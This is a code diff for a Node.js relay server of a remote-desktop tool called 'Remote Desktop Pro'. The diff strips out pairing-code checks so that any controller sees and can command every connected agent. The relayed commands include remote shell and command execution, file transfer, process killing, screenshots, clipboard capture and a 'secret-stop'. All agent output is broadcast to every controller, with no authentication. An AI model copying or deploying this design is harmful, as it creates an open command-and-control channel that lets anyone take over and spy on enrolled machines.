@@ -1,9 +1,9 @@
 /**
  * Remote Desktop Pro - Cloud Relay Server
- * Deploy this on Render.com (free) or Fly.io (free)
+ * NO PAIRING CODES - Automatic Discovery!
  * 
- * This acts as a middleman so agents and controllers can find each other
- * across different networks without port forwarding.
+ * Agents connect and are automatically visible to all controllers.
+ * Controllers see all connected agents and can control any of them.
  */
 
 const express = require('express');
@@ -19,20 +19,9 @@ const io = new Server(server, {
   pingInterval: 25000
 });
 
-// Store connected devices
-const agents = new Map();      // agentId -> { socket, info, controllerId, waitingForCode }
-const controllers = new Map(); // controllerId -> { socket, agentIds, code }
-const pairingCodes = new Map(); // 6-digit code -> { controllerId, created }
-
-// Generate 6-digit pairing code
-function generateCode() {
-  return Math.floor(100000 + Math.random() * 900000).toString();
-}
-
-// Validate code format
-function isValidCode(code) {
-  return code && /^\d{6}$/.test(code);
-}
+// Store connected devices - Simple!
+const agents = new Map();      // agentId -> { socket, info }
+const controllers = new Map(); // controllerId -> { socket }
 
 // Health check endpoint
 app.get('/', (req, res) => {
@@ -44,37 +33,24 @@ app.get('/', (req, res) => {
   });
 });
 
-// API to lookup pairing code (for agents)
-app.get('/lookup/:code', (req, res) => {
-  const code = req.params.code;
-  const pairing = pairingCodes.get(code);
-  
-  if (pairing) {
-    res.json({ found: true, controllerId: pairing.controllerId });
-  } else {
-    res.json({ found: false });
-  }
-});
-
-// List agents for a controller
-app.get('/agents/:controllerId', (req, res) => {
+// API to get all agents
+app.get('/agents', (req, res) => {
   const agentList = [];
   agents.forEach((agent, id) => {
-    if (agent.controllerId === req.params.controllerId) {
-      agentList.push({
-        id,
-        hostname: agent.info?.hostname,
-        username: agent.info?.username,
-        platform: agent.info?.platform,
-        connected: true
-      });
-    }
+    agentList.push({
+      id,
+      hostname: agent.info?.hostname,
+      username: agent.info?.username,
+      platform: agent.info?.platform,
+      connected: agent.socket.connected
+    });
   });
   res.json(agentList);
 });
 
 console.log('═'.repeat(50));
 console.log('  REMOTE DESKTOP PRO - CLOUD RELAY');
+console.log('  Auto-Discovery Mode (No Pairing Codes)');
 console.log('═'.repeat(50));
 
 io.on('connection', (socket) => {
@@ -82,78 +58,29 @@ io.on('connection', (socket) => {
   
   // ============ CONTROLLER EVENTS ============
   
-  // Controller registers and gets a pairing code
+  // Controller registers - immediately gets list of all agents
   socket.on('controller:register', (info) => {
     const controllerId = socket.id;
-    let code;
-    
-    // Check if controller requested a specific code (reconnecting)
-    if (info?.requestCode && isValidCode(info.requestCode)) {
-      code = info.requestCode;
-      // Remove old pairing if exists
-      pairingCodes.delete(code);
-    } else {
-      code = generateCode();
-    }
     
     controllers.set(controllerId, {
       socket,
-      info,
-      code,
-      agentIds: new Set()
+      info
     });
     
-    pairingCodes.set(code, {
-      controllerId,
-      created: Date.now()
-    });
-    
-    console.log(`[CONTROLLER] Registered: ${controllerId}, Code: ${code}`);
-    
-    // Check if any agents are waiting with this code
-    agents.forEach((agent, agentId) => {
-      if (agent.waitingForCode === code) {
-        // Connect this waiting agent to the controller
-        agent.controllerId = controllerId;
-        agent.waitingForCode = null;
-        controllers.get(controllerId).agentIds.add(agentId);
-        
-        agent.socket.emit('agent:registered', { 
-          agentId,
-          controllerId 
-        });
-        
-        socket.emit('controller:agent-joined', {
-          id: agentId,
-          hostname: agent.info?.hostname,
-          username: agent.info?.username,
-          platform: agent.info?.platform,
-          screens: agent.info?.screens
-        });
-        
-        console.log(`[AGENT] Reconnected waiting agent: ${agent.info?.hostname}`);
-      }
-    });
+    console.log(`[CONTROLLER] Registered: ${controllerId}`);
     
     socket.emit('controller:registered', { 
-      controllerId, 
-      code,
-      message: 'Share this code with agents to connect'
+      controllerId,
+      message: 'Connected! Showing all available agents.'
     });
     
-    // Send current agent list
-    const agentList = [];
-    agents.forEach((agent, id) => {
-      if (agent.controllerId === controllerId) {
-        agentList.push({
-          id,
-          hostname: agent.info?.hostname,
-          username: agent.info?.username,
-          platform: agent.info?.platform
-        });
-      }
-    });
-    socket.emit('controller:agent-list', agentList);
+    // Send list of all connected agents
+    sendAgentListToController(socket);
+  });
+  
+  // Controller requests agent list refresh
+  socket.on('controller:refresh', () => {
+    sendAgentListToController(socket);
   });
   
   // Controller wants to connect to specific agent
@@ -169,75 +96,34 @@ io.on('connection', (socket) => {
   
   // ============ AGENT EVENTS ============
   
-  // Agent registers with a pairing code
+  // Agent registers - no code needed!
   socket.on('agent:register', (data) => {
-    const { code, info } = data;
+    const { info } = data;
     const agentId = socket.id;
     
-    // Find controller by code
-    const pairing = pairingCodes.get(code);
-    
-    if (!pairing) {
-      // Controller not online yet - wait for it
-      console.log(`[AGENT] Waiting for controller with code: ${code}`);
-      
-      agents.set(agentId, {
-        socket,
-        info,
-        controllerId: null,
-        waitingForCode: code  // Store the code we're waiting for
-      });
-      
-      socket.emit('agent:waiting', { 
-        message: 'Waiting for controller to come online...',
-        code 
-      });
-      return;
-    }
-    
-    const controller = controllers.get(pairing.controllerId);
-    if (!controller) {
-      // Controller disconnected - wait for reconnect
-      console.log(`[AGENT] Controller offline, waiting: ${code}`);
-      
-      agents.set(agentId, {
-        socket,
-        info,
-        controllerId: null,
-        waitingForCode: code
-      });
-      
-      socket.emit('agent:waiting', { 
-        message: 'Controller offline, waiting for reconnect...',
-        code 
-      });
-      return;
-    }
-    
-    // Register agent
     agents.set(agentId, {
       socket,
-      info,
-      controllerId: pairing.controllerId,
-      waitingForCode: null
+      info
     });
     
-    controller.agentIds.add(agentId);
-    
-    console.log(`[AGENT] Registered: ${info?.hostname} -> Controller ${pairing.controllerId}`);
+    console.log(`[AGENT] Registered: ${info?.hostname} (${agentId})`);
     
     socket.emit('agent:registered', { 
       agentId,
-      controllerId: pairing.controllerId 
+      message: 'Connected! Controllers can now see you.'
     });
     
-    // Notify controller of new agent
-    controller.socket.emit('controller:agent-joined', {
-      id: agentId,
-      hostname: info?.hostname,
-      username: info?.username,
-      platform: info?.platform,
-      screens: info?.screens
+    // Notify ALL controllers that a new agent is available
+    controllers.forEach((controller) => {
+      if (controller.socket.connected) {
+        controller.socket.emit('controller:agent-joined', {
+          id: agentId,
+          hostname: info?.hostname,
+          username: info?.username,
+          platform: info?.platform,
+          screens: info?.screens
+        });
+      }
     });
   });
   
@@ -251,7 +137,8 @@ io.on('connection', (socket) => {
     'control:file-list', 'control:file-download', 'control:file-upload',
     'control:system-info', 'control:processes', 'control:kill-process',
     'control:command', 'control:shell', 'control:message',
-    'control:secret-stop', 'control:get-agent-status'
+    'control:secret-stop', 'control:get-agent-status',
+    'control:lock-screen', 'control:screenshot'
   ];
   
   controlEvents.forEach(event => {
@@ -260,28 +147,33 @@ io.on('connection', (socket) => {
       if (targetAgentId) {
         const agent = agents.get(targetAgentId);
         if (agent && agent.socket.connected) {
+          console.log(`[RELAY] ${event} -> ${targetAgentId}`);
           agent.socket.emit(event, data);
         }
       }
     });
   });
   
-  // From Agent to Controller
+  // From Agent to Controller (broadcast to all controllers)
   const agentEvents = [
     'agent:frame', 'agent:clipboard', 'agent:file-list', 'agent:file-download', 
     'agent:file-upload', 'agent:system-info', 'agent:processes', 
-    'agent:kill-process', 'agent:shell', 'agent:heartbeat'
+    'agent:kill-process', 'agent:shell', 'agent:heartbeat', 'agent:screenshot'
   ];
   
   agentEvents.forEach(event => {
     socket.on(event, (data) => {
-      const agent = agents.get(socket.id);
-      if (agent) {
-        const controller = controllers.get(agent.controllerId);
-        if (controller && controller.socket.connected) {
+      // Only log non-frame events to avoid spam
+      if (event !== 'agent:frame') {
+        console.log(`[RELAY] ${event} from ${socket.id}`);
+      }
+      
+      // Broadcast to all controllers
+      controllers.forEach((controller) => {
+        if (controller.socket.connected) {
           controller.socket.emit(event, { ...data, agentId: socket.id });
         }
-      }
+      });
     });
   });
   
@@ -291,55 +183,51 @@ io.on('connection', (socket) => {
     // Check if it was an agent
     if (agents.has(socket.id)) {
       const agent = agents.get(socket.id);
-      const controller = controllers.get(agent.controllerId);
       
-      if (controller) {
-        controller.agentIds.delete(socket.id);
-        controller.socket.emit('controller:agent-left', { agentId: socket.id });
-      }
+      // Notify all controllers
+      controllers.forEach((controller) => {
+        if (controller.socket.connected) {
+          controller.socket.emit('controller:agent-left', { 
+            agentId: socket.id,
+            hostname: agent.info?.hostname
+          });
+        }
+      });
       
       agents.delete(socket.id);
-      console.log(`[AGENT] Disconnected: ${socket.id}`);
+      console.log(`[AGENT] Disconnected: ${agent.info?.hostname || socket.id}`);
     }
     
     // Check if it was a controller
     if (controllers.has(socket.id)) {
-      const controller = controllers.get(socket.id);
-      
-      // Notify all agents
-      controller.agentIds.forEach(agentId => {
-        const agent = agents.get(agentId);
-        if (agent) {
-          agent.socket.emit('agent:controller-disconnected');
-        }
-      });
-      
-      // Remove pairing code
-      pairingCodes.forEach((value, key) => {
-        if (value.controllerId === socket.id) {
-          pairingCodes.delete(key);
-        }
-      });
-      
       controllers.delete(socket.id);
       console.log(`[CONTROLLER] Disconnected: ${socket.id}`);
     }
   });
 });
 
-// Clean up old pairing codes every hour
-setInterval(() => {
-  const oneHourAgo = Date.now() - 3600000;
-  pairingCodes.forEach((value, key) => {
-    if (value.created < oneHourAgo) {
-      pairingCodes.delete(key);
+// Helper function to send agent list
+function sendAgentListToController(socket) {
+  const agentList = [];
+  agents.forEach((agent, id) => {
+    if (agent.socket.connected) {
+      agentList.push({
+        id,
+        hostname: agent.info?.hostname,
+        username: agent.info?.username,
+        platform: agent.info?.platform,
+        screens: agent.info?.screens
+      });
     }
   });
-}, 3600000);
+  socket.emit('controller:agent-list', agentList);
+}
 
 // Start server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`  Relay running on port ${PORT}`);
+  console.log('  Agents will auto-register when they connect');
+  console.log('  Controllers will see all connected agents');
   console.log('═'.repeat(50));
 });
